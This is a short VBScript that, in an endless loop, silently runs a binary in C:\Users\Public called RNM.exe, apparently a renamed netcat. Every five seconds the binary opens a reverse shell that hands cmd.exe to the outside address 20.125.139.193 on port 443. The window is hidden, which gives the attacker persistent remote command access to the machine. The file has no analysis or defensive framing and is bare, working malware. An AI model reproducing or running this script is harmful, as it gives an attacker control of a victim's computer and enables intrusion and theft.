Set objShell = CreateObject("WScript.Shell")

Do While True
    objShell.Run "cmd.exe /c C:\Users\Public\RNM.exe -nv 20.125.139.193 443 -e cmd.exe", 0, False
    WScript.Sleep 5000  ' Espera 5000 milisegundos (5 segundos)
Loop
